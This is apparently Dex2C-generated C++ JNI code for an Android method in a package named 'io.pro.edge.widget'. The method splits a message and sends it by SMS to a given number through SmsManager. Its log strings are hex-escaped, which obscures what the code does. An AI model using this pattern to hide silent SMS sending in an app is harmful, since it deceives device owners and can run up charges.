#include "Dex2C.h"

/* Lio/pro/edge/widget/event/utils/SmsUtils;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V */
extern "C" JNIEXPORT void JNICALL
Java_io_pro_edge_widget_event_utils_SmsUtils_a__Landroid_content_Context_2Ljava_lang_String_2Ljava_lang_String_2(JNIEnv *env, jobject thiz, jobject p9, jstring p10, jstring p11){
jobject v0 = NULL;
jobject v1 = NULL;
jobject v2 = NULL;
jint v3;
jint v4;
jobject v5 = NULL;
jobject v6 = NULL;
jobject v7 = NULL;
jobject v8 = NULL;
jint v9;
jobject v10 = NULL;
jint v11;
jobject v12 = NULL;
jobject v13 = NULL;
jobject v14 = NULL;
jobject v15 = NULL;
jthrowable exception;
jclass cls0 = NULL,cls1 = NULL,cls2 = NULL,cls3 = NULL,cls4 = NULL,cls5 = NULL,cls6 = NULL,cls7 = NULL,cls8 = NULL;
jmethodID mth0 = NULL, mth1 = NULL, mth2 = NULL, mth3 = NULL, mth4 = NULL, mth5 = NULL, mth6 = NULL, mth7 = NULL, mth8 = NULL, mth9 = NULL, mth10 = NULL;
v0 = (jobject)env->NewLocalRef(p9);
v1 = (jobject)env->NewLocalRef(p10);
v2 = (jobject)env->NewLocalRef(p11);
L0:
LOGD("0:invoke-static \x76\x31\x30\x2c\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x74\x65\x78\x74\x2f\x54\x65\x78\x74\x55\x74\x69\x6c\x73\x3b\x2d\x3e\x69\x73\x45\x6d\x70\x74\x79\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x68\x61\x72\x53\x65\x71\x75\x65\x6e\x63\x65\x3b\x29\x5a");
{
#define EX_HANDLE EX_UnwindBlock
jclass &clz = cls0;
jmethodID &mid = mth0;
D2C_RESOLVE_STATIC_METHOD(clz, mid, "android/text/TextUtils", "isEmpty", "(Ljava/lang/CharSequence;)Z");
jvalue args[] = {{.l = v1}};
v3 = (jboolean) env->CallStaticBooleanMethodA(clz, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
LOGD("6:move-result \x76\x30");
v4 = (jint) v3;
LOGD("8:if-nez \x76\x30\x2c\x20\x2b\x33\x66");
if(v4 != 0){
goto L26;
}
else {
goto L1;
}
L1:
LOGD("c:invoke-static \x76\x31\x31\x2c\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x74\x65\x78\x74\x2f\x54\x65\x78\x74\x55\x74\x69\x6c\x73\x3b\x2d\x3e\x69\x73\x45\x6d\x70\x74\x79\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x68\x61\x72\x53\x65\x71\x75\x65\x6e\x63\x65\x3b\x29\x5a");
{
#define EX_HANDLE EX_UnwindBlock
jclass &clz = cls0;
jmethodID &mid = mth0;
D2C_RESOLVE_STATIC_METHOD(clz, mid, "android/text/TextUtils", "isEmpty", "(Ljava/lang/CharSequence;)Z");
jvalue args[] = {{.l = v2}};
v3 = (jboolean) env->CallStaticBooleanMethodA(clz, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
LOGD("12:move-result \x76\x30");
v4 = (jint) v3;
LOGD("14:if-eqz \x76\x30\x2c\x20\x2b\x33");
if(v4 == 0){
goto L3;
}
else {
goto L2;
}
L2:
goto L26;
L3:
LOGD("1a:invoke-static \x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x74\x65\x6c\x65\x70\x68\x6f\x6e\x79\x2f\x53\x6d\x73\x4d\x61\x6e\x61\x67\x65\x72\x3b\x2d\x3e\x67\x65\x74\x44\x65\x66\x61\x75\x6c\x74\x28\x29\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x74\x65\x6c\x65\x70\x68\x6f\x6e\x79\x2f\x53\x6d\x73\x4d\x61\x6e\x61\x67\x65\x72\x3b");
{
#define EX_HANDLE EX_LandingPad_3
jclass &clz = cls1;
jmethodID &mid = mth1;
D2C_RESOLVE_STATIC_METHOD(clz, mid, "android/telephony/SmsManager", "getDefault", "()Landroid/telephony/SmsManager;");
jvalue args[] = {};
v5 = (jobject) env->CallStaticObjectMethodA(clz, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L4:
LOGD("20:move-result-object \x76\x30");
if (v6) {
LOGD("env->DeleteLocalRef(%p):v6", v6);
env->DeleteLocalRef(v6);
}
v6 = (jobject) v5;
L5:
LOGD("22:invoke-virtual \x76\x30\x2c\x20\x76\x31\x31\x2c\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x74\x65\x6c\x65\x70\x68\x6f\x6e\x79\x2f\x53\x6d\x73\x4d\x61\x6e\x61\x67\x65\x72\x3b\x2d\x3e\x64\x69\x76\x69\x64\x65\x4d\x65\x73\x73\x61\x67\x65\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x3b");
{
#define EX_HANDLE EX_LandingPad_3
D2C_NOT_NULL(v6);
jclass &clz = cls1;
jmethodID &mid = mth2;
D2C_RESOLVE_METHOD(clz, mid, "android/telephony/SmsManager", "divideMessage", "(Ljava/lang/String;)Ljava/util/ArrayList;");
jvalue args[] = {{.l = v2}};
v5 = (jobject) env->CallObjectMethodA(v6, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L6:
LOGD("28:move-result-object \x76\x31\x31");
if (v2) {
LOGD("env->DeleteLocalRef(%p):v2", v2);
env->DeleteLocalRef(v2);
}
v2 = (jobject) v5;
L7:
LOGD("2a:new-instance \x76\x31\x2c\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x2f\x49\x6e\x74\x65\x6e\x74\x3b");
{
#define EX_HANDLE EX_LandingPad_3
if (v7) {
LOGD("env->DeleteLocalRef(%p):v7", v7);
env->DeleteLocalRef(v7);
}
jclass &clz = cls2;
D2C_RESOLVE_CLASS(clz,"android/content/Intent");
v7 = (jobject) env->AllocObject(clz);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L8:
LOGD("2e:const-string \x76\x32\x2c\x20\x27\x53\x45\x4e\x54\x5f\x53\x4d\x53\x5f\x41\x43\x54\x49\x4f\x4e\x27");
if (v8) {
LOGD("env->DeleteLocalRef(%p):v8", v8);
env->DeleteLocalRef(v8);
}
v8 = (jstring) env->NewStringUTF("\x53\x45\x4e\x54\x5f\x53\x4d\x53\x5f\x41\x43\x54\x49\x4f\x4e");
L9:
LOGD("32:invoke-direct \x76\x31\x2c\x20\x76\x32\x2c\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x2f\x49\x6e\x74\x65\x6e\x74\x3b\x2d\x3e\x3c\x69\x6e\x69\x74\x3e\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x56");
{
#define EX_HANDLE EX_LandingPad_3
D2C_NOT_NULL(v7);
jclass &clz = cls2;
jmethodID &mid = mth3;
D2C_RESOLVE_METHOD(clz, mid, "android/content/Intent", "<init>", "(Ljava/lang/String;)V");
jvalue args[] = {{.l = v8}};
env->CallVoidMethodA(v7, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L10:
v9 = 0;
v9 = 0;
L11:
LOGD("3a:invoke-static \x76\x39\x2c\x20\x76\x37\x2c\x20\x76\x31\x2c\x20\x76\x37\x2c\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x61\x70\x70\x2f\x50\x65\x6e\x64\x69\x6e\x67\x49\x6e\x74\x65\x6e\x74\x3b\x2d\x3e\x67\x65\x74\x42\x72\x6f\x61\x64\x63\x61\x73\x74\x28\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x2f\x43\x6f\x6e\x74\x65\x78\x74\x3b\x20\x49\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x2f\x49\x6e\x74\x65\x6e\x74\x3b\x20\x49\x29\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x61\x70\x70\x2f\x50\x65\x6e\x64\x69\x6e\x67\x49\x6e\x74\x65\x6e\x74\x3b");
{
#define EX_HANDLE EX_LandingPad_3
jclass &clz = cls3;
jmethodID &mid = mth4;
D2C_RESOLVE_STATIC_METHOD(clz, mid, "android/app/PendingIntent", "getBroadcast", "(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;");
jvalue args[] = {{.l = v0},{.i = v9},{.l = v7},{.i = v9}};
v5 = (jobject) env->CallStaticObjectMethodA(clz, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L12:
LOGD("40:move-result-object \x76\x38");
if (v10) {
LOGD("env->DeleteLocalRef(%p):v10", v10);
env->DeleteLocalRef(v10);
}
v10 = (jobject) v5;
L13:
LOGD("42:invoke-interface \x76\x31\x31\x2c\x20\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x2d\x3e\x69\x74\x65\x72\x61\x74\x6f\x72\x28\x29\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x49\x74\x65\x72\x61\x74\x6f\x72\x3b");
{
#define EX_HANDLE EX_LandingPad_3
D2C_NOT_NULL(v2);
jclass &clz = cls4;
jmethodID &mid = mth5;
D2C_RESOLVE_METHOD(clz, mid, "java/util/List", "iterator", "()Ljava/util/Iterator;");
jvalue args[] = {};
v5 = (jobject) env->CallObjectMethodA(v2, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L14:
LOGD("48:move-result-object \x76\x31\x31");
if (v2) {
LOGD("env->DeleteLocalRef(%p):v2", v2);
env->DeleteLocalRef(v2);
}
v2 = (jobject) v5;
L15:
LOGD("4a:invoke-interface \x76\x31\x31\x2c\x20\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x49\x74\x65\x72\x61\x74\x6f\x72\x3b\x2d\x3e\x68\x61\x73\x4e\x65\x78\x74\x28\x29\x5a");
{
#define EX_HANDLE EX_LandingPad_3
D2C_NOT_NULL(v2);
jclass &clz = cls5;
jmethodID &mid = mth6;
D2C_RESOLVE_METHOD(clz, mid, "java/util/Iterator", "hasNext", "()Z");
jvalue args[] = {};
v3 = (jboolean) env->CallBooleanMethodA(v2, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L16:
LOGD("50:move-result \x76\x31");
v11 = (jint) v3;
LOGD("52:if-eqz \x76\x31\x2c\x20\x2b\x31\x32");
if(v11 == 0){
goto L23;
}
else {
goto L17;
}
L17:
LOGD("56:invoke-interface \x76\x31\x31\x2c\x20\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x49\x74\x65\x72\x61\x74\x6f\x72\x3b\x2d\x3e\x6e\x65\x78\x74\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b");
{
#define EX_HANDLE EX_LandingPad_3
D2C_NOT_NULL(v2);
jclass &clz = cls5;
jmethodID &mid = mth7;
D2C_RESOLVE_METHOD(clz, mid, "java/util/Iterator", "next", "()Ljava/lang/Object;");
jvalue args[] = {};
v5 = (jobject) env->CallObjectMethodA(v2, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L18:
LOGD("5c:move-result-object \x76\x31");
if (v7) {
LOGD("env->DeleteLocalRef(%p):v7", v7);
env->DeleteLocalRef(v7);
}
v7 = (jobject) v5;
if (v12) {
LOGD("env->DeleteLocalRef(%p):v12", v12);
env->DeleteLocalRef(v12);
}
v12 = (jobject) env->NewLocalRef(v7);
L19:
LOGD("60:check-cast \x76\x34\x2c\x20\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b");
{
#define EX_HANDLE EX_LandingPad_3
jclass &clz = cls6;
D2C_RESOLVE_CLASS(clz,"java/lang/String");
D2C_CHECK_CAST(v12, clz, "java/lang/String");
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L20:
if (v13) {
LOGD("env->DeleteLocalRef(%p):v13", v13);
env->DeleteLocalRef(v13);
}
v13 = 0;
if (v14) {
LOGD("env->DeleteLocalRef(%p):v14", v14);
env->DeleteLocalRef(v14);
}
v14 = 0;
if (v7) {
LOGD("env->DeleteLocalRef(%p):v7", v7);
env->DeleteLocalRef(v7);
}
v7 = (jobject) env->NewLocalRef(v6);
if (v8) {
LOGD("env->DeleteLocalRef(%p):v8", v8);
env->DeleteLocalRef(v8);
}
v8 = (jobject) env->NewLocalRef(v1);
if (v15) {
LOGD("env->DeleteLocalRef(%p):v15", v15);
env->DeleteLocalRef(v15);
}
v15 = (jobject) env->NewLocalRef(v10);
L21:
LOGD("6e:invoke-virtual/range \x76\x31\x20\x2e\x2e\x2e\x20\x76\x36\x2c\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x74\x65\x6c\x65\x70\x68\x6f\x6e\x79\x2f\x53\x6d\x73\x4d\x61\x6e\x61\x67\x65\x72\x3b\x2d\x3e\x73\x65\x6e\x64\x54\x65\x78\x74\x4d\x65\x73\x73\x61\x67\x65\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x20\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x20\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x61\x70\x70\x2f\x50\x65\x6e\x64\x69\x6e\x67\x49\x6e\x74\x65\x6e\x74\x3b\x20\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x61\x70\x70\x2f\x50\x65\x6e\x64\x69\x6e\x67\x49\x6e\x74\x65\x6e\x74\x3b\x29\x56");
{
#define EX_HANDLE EX_LandingPad_3
D2C_NOT_NULL(v7);
jclass &clz = cls1;
jmethodID &mid = mth8;
D2C_RESOLVE_METHOD(clz, mid, "android/telephony/SmsManager", "sendTextMessage", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V");
jvalue args[] = {{.l = v8},{.l = v13},{.l = v12},{.l = v15},{.l = v14}};
env->CallVoidMethodA(v7, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L22:
goto L15;
L23:
LOGD("76:invoke-static \x76\x39\x2c\x20\x76\x37\x2c\x20\x4c\x69\x6f\x2f\x70\x72\x6f\x2f\x65\x64\x67\x65\x2f\x77\x69\x64\x67\x65\x74\x2f\x65\x76\x65\x6e\x74\x2f\x75\x74\x69\x6c\x73\x2f\x49\x6e\x55\x74\x69\x6c\x73\x3b\x2d\x3e\x61\x28\x4c\x61\x6e\x64\x72\x6f\x69\x64\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x2f\x43\x6f\x6e\x74\x65\x78\x74\x3b\x20\x49\x29\x56");
{
#define EX_HANDLE EX_LandingPad_3
jclass &clz = cls7;
jmethodID &mid = mth9;
D2C_RESOLVE_STATIC_METHOD(clz, mid, "io/pro/edge/widget/event/utils/InUtils", "a", "(Landroid/content/Context;I)V");
jvalue args[] = {{.l = v0},{.i = v9}};
env->CallStaticVoidMethodA(clz, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L24:
goto L26;
L25:
LOGD("7e:move-exception \x76\x39");
if (v0) {
LOGD("env->DeleteLocalRef(%p):v0", v0);
env->DeleteLocalRef(v0);
}
v0 = exception;
LOGD("80:invoke-virtual \x76\x39\x2c\x20\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x2d\x3e\x70\x72\x69\x6e\x74\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x28\x29\x56");
{
#define EX_HANDLE EX_UnwindBlock
D2C_NOT_NULL(v0);
jclass &clz = cls8;
jmethodID &mid = mth10;
D2C_RESOLVE_METHOD(clz, mid, "java/lang/Throwable", "printStackTrace", "()V");
jvalue args[] = {};
env->CallVoidMethodA(v0, mid, args);
D2C_CHECK_PENDING_EX;
#undef EX_HANDLE
}
L26:
return;

EX_LandingPad_3:
D2C_GET_PENDING_EX
if(d2c_is_instance_of(env, exception, "java/lang/Throwable")) {
goto L25;
}
D2C_GOTO_UNWINDBLOCK
EX_UnwindBlock: return;
}
